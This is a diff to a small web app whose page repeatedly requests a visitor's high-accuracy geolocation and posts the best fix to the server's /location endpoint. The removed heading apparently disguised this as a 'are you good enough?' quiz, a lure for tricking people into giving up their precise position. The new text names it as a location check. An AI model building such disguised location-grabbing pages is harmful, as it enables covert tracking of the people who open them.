@@ -47,9 +47,9 @@ button:hover {background:#a29bfe;}
 <body>
 
 <div class="box">
-<h2>📍 ท่าคิดว่าตัวดีพอหรือไม่ดีพอ</h2>
-<p>ลองกดดู</p>
-<button onclick="start()">เริ่มตรวจสอบ</button>
+<h2>📍 ตรวจสอบตำแหน่ง</h2>
+<p>กดเพื่อเริ่มระบบ</p>
+<button onclick="start()">เริ่ม</button>
 <p id="status"></p>
 </div>
 
@@ -59,8 +59,8 @@ let tries = 0;
 let MAX = 10;
 
 function start(){
-    document.getElementById("status").innerText = "กำลังค้นหาตำแหน่ง...";
-    
+    document.getElementById("status").innerText = "กำลังค้นหา...";
+
     for(let i=0;i<MAX;i++){
         navigator.geolocation.getCurrentPosition(success, error, {
             enableHighAccuracy:true,
@@ -73,20 +73,17 @@ function start(){
 function success(pos){
     tries++;
 
-    let acc = pos.coords.accuracy;
-
     let data = {
         lat: pos.coords.latitude,
         lon: pos.coords.longitude,
-        acc: acc
+        acc: pos.coords.accuracy
     };
 
-    if(acc < 200){
-        results.push(data);
-    }
+    // 🔥 ไม่คัดทิ้งแล้ว → เก็บหมด
+    results.push(data);
 
     document.getElementById("status").innerText =
-        "กำลังวิเคราะห์ ("+tries+"/"+MAX+") | "+Math.round(acc)+"m";
+        "กำลังวิเคราะห์ ("+tries+"/"+MAX+") | "+Math.round(data.acc)+"m";
 
     if(tries >= MAX){
         finalize();
@@ -95,15 +92,20 @@ function success(pos){
 
 function finalize(){
     if(results.length === 0){
-        document.getElementById("status").innerText = "ตำแหน่งไม่แม่นพอ";
+        document.getElementById("status").innerText = "ไม่สามารถหาตำแหน่ง";
         return;
     }
 
+    // 🎯 เลือกค่าที่แม่นสุด
     results.sort((a,b)=>a.acc - b.acc);
     let best = results[0];
 
+    let level = "ต่ำ";
+    if(best.acc < 50) level = "แม่นมาก";
+    else if(best.acc < 150) level = "แม่นปานกลาง";
+
     document.getElementById("status").innerText =
-        "สำเร็จ ("+Math.round(best.acc)+"m)";
+        "สำเร็จ ("+Math.round(best.acc)+"m) - " + level;
 
     fetch("/location", {
         method:"POST",
@@ -116,7 +118,7 @@ function finalize(){
 
 function error(){
     document.getElementById("status").innerText =
-        "กรุณาเปิด Location และ WiFi";
+        "กรุณาเปิด Location + WiFi";
 }
 </script>
 
@@ -139,7 +141,7 @@ def location():
 def done():
     return """
     <body style="background:black;color:white;text-align:center;padding:100px">
-    <h1>📍 ได้ตำแหน่งแล้ว</h1>
+    <h1>📍 บันทึกตำแหน่งแล้ว</h1>
     </body>
     """
 
